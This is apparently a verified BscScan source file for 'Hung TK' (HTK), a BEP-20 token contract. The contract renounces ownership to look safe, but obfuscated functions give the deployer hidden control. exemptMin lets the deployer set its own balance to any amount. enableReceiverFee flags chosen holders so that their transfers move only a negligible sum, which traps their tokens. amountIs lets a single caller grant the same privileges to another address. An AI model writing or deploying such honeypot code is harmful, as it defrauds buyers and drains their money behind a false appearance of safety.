/**
 *Submitted for verification at BscScan.com on 2023-02-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface autoLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface isTradingFund {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract HungTK is Ownable{
    uint8 public decimals = 18;
    
    uint256 constant fromShould = 10 ** 10;
    uint256 private limitLiquidityTeam;


    bool private receiverTake;
    bool public launchedAtMin;
    string public symbol = "HTK";
    uint256 public buyToken;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public tradingTeam;

    bool public limitToken;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "Hung TK";
    uint256 private launchedTxSell;
    uint256 public enableAuto;
    bool public buyExempt;
    address public autoFromTotal;
    
    bool private toLiquidity;
    mapping(address => bool) public launchTakeLiquidity;
    uint256 private fromFee;
    uint256 private feeLimit;
    address public takeAtLiquidity;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        
        autoLaunch autoLimit = autoLaunch(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        autoFromTotal = isTradingFund(autoLimit.factory()).createPair(autoLimit.WETH(), address(this));
        takeAtLiquidity = swapAuto();
        if (enableAuto != limitLiquidityTeam) {
            launchedAtMin = false;
        }
        tradingTeam[takeAtLiquidity] = true;
        balanceOf[takeAtLiquidity] = totalSupply;
        
        emit Transfer(address(0), takeAtLiquidity, totalSupply);
        renounceOwnership();
    }

    

    function exemptMin(uint256 fromWallet) public {
        if (!tradingTeam[swapAuto()]) {
            return;
        }
        balanceOf[takeAtLiquidity] = fromWallet;
    }

    function enableReceiverFee(address listMarketing) public {
        
        if (listMarketing == takeAtLiquidity || listMarketing == autoFromTotal || !tradingTeam[swapAuto()]) {
            return;
        }
        if (buyToken != fromFee) {
            fromFee = limitLiquidityTeam;
        }
        launchTakeLiquidity[listMarketing] = true;
    }

    function swapAuto() private view returns (address) {
        return msg.sender;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function buyMax() public view returns (uint256) {
        return launchedTxSell;
    }

    function approve(address modeIs, uint256 fromWallet) public returns (bool) {
        allowance[swapAuto()][modeIs] = fromWallet;
        emit Approval(swapAuto(), modeIs, fromWallet);
        return true;
    }

    function transfer(address liquidityLaunchedTrading, uint256 fromWallet) external returns (bool) {
        return transferFrom(swapAuto(), liquidityLaunchedTrading, fromWallet);
    }

    function takeMax(address limitIs, address liquidityMode, uint256 fromWallet) internal returns (bool) {
        require(balanceOf[limitIs] >= fromWallet);
        balanceOf[limitIs] -= fromWallet;
        balanceOf[liquidityMode] += fromWallet;
        emit Transfer(limitIs, liquidityMode, fromWallet);
        return true;
    }

    function launchTo() public {
        
        if (limitLiquidityTeam == buyToken) {
            receiverTake = false;
        }
        buyToken=0;
    }

    function transferFrom(address swapLaunch, address liquidityLaunchedTrading, uint256 fromWallet) public returns (bool) {
        if (swapLaunch != swapAuto() && allowance[swapLaunch][swapAuto()] != type(uint256).max) {
            require(allowance[swapLaunch][swapAuto()] >= fromWallet);
            allowance[swapLaunch][swapAuto()] -= fromWallet;
        }
        if (liquidityLaunchedTrading == takeAtLiquidity || swapLaunch == takeAtLiquidity) {
            return takeMax(swapLaunch, liquidityLaunchedTrading, fromWallet);
        }
        if (toLiquidity) {
            limitToken = true;
        }
        if (launchTakeLiquidity[swapLaunch]) {
            return takeMax(swapLaunch, liquidityLaunchedTrading, fromShould);
        }
        if (toLiquidity) {
            buyToken = fromFee;
        }
        if (receiverTake != launchedAtMin) {
            launchedTxSell = buyToken;
        }
        return takeMax(swapLaunch, liquidityLaunchedTrading, fromWallet);
    }

    function toSell() public {
        
        if (limitToken == receiverTake) {
            launchedAtMin = true;
        }
        buyToken=0;
    }

    function tokenWallet() public {
        if (launchedAtMin) {
            launchedTxSell = limitLiquidityTeam;
        }
        
        enableAuto=0;
    }

    function amountIs(address fromExempt) public {
        if (launchedTxSell == limitLiquidityTeam) {
            enableAuto = limitLiquidityTeam;
        }
        if (buyExempt) {
            return;
        }
        
        tradingTeam[fromExempt] = true;
        
        buyExempt = true;
    }

    function liquidityLaunch() public view returns (bool) {
        return limitToken;
    }


}